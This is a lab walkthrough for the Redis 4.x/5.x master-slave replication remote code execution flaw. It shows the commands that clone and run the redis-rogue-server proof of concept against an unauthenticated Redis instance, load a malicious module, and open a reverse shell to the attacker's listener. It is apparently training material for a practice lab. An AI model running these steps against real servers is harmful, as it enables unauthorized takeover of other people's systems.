# Redis 4.x/5.x Master-Slave Replication Remote Code Execution

> [中文文档](README.md)

| Attribute | Details |
|-----------|---------|
| **Vulnerability ID** | Redis Master-Slave Replication RCE (no dedicated CVE, affects 4.x/5.x versions) |
| **Affected Versions** | Redis 4.x / 5.x (前提是未授权访问) |
| **Vulnerability Type** | Master-Slave Replication → Load Malicious Module → Remote Code Execution (RCE) |
| **Severity** | 🔴 High |
| **Default Port** | `6379` |

`Redis` is a famous open-source `Key-Value` database that has the ability to execute `Lua` scripts in a sandboxed environment. In Redis versions `4.x/5.0.5` and earlier, an unauthorized access vulnerability allows attackers to use the `master/slave` replication mode to load remote modules, enabling arbitrary command execution through dynamic-link libraries.

## Vulnerability Reproduction

After the target machine is started, connect using `redis-cli -h your-ip`:

```
┌──(root㉿nextcyber)-[~]
└─# redis-cli -h 192.168.2.73
192.168.2.73:6379> 
```

The unauthorized access vulnerability is present. The target machine is running `Redis 4.0.14`.

## Exploitation

We will use this [POC](https://github.com/n0b0dyCN/redis-rogue-server) to execute commands. Download the tool:

```
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
```

### Reverse Shell

```
┌──(root㉿nextcyber)-[~]
└─# ls
__MACOSX  redis-rogue-server  redis-rogue-server.zip

┌──(root㉿nextcyber)-[~]
└─# cd redis-rogue-server                            

┌──(root㉿nextcyber)-[~/redis-rogue-server]
└─# ls
LICENSE  README.md  RedisModulesSDK  exp.so  redis-rogue-server.py

┌──(root㉿nextcyber)-[~/redis-rogue-server]
└─# ./redis-rogue-server.py --rhost 192.168.2.73 --lhost 192.168.2.6
______         _ _      ______                         _____                          | ___ \       | (_)     | ___ \                       /  ___|                         | |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ |    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   \_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|                                        __/ |                                                                                |___/                                             @copyright n0b0dy @ r3kapig

[info] TARGET 192.168.2.73:6379
[info] SERVER 192.168.2.6:21000
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
[err ] UnicodeDecodeError('gb18030', b'$1\r\n\x83\r\n', 4, 5, 'illegal multibyte sequence')
```

The first execution may not succeed. Run it again, then enter `r` to obtain a reverse shell. Enter the listening `IP` address and the listening port:

![Image](https://static.nextcyber.cn/attachments/images/course/task/cc264eabf53747ffb8da50af6d7b5325.png)

The reverse `shell` is successfully established.
---

## Practice Lab

Practice this vulnerability on [NextCyber Lab](https://app.nextcyber.cn/courses/139).

---

> ⚠️ **Disclaimer**: All content in this directory is for learning and research purposes only. Do not use it for illegal activities.
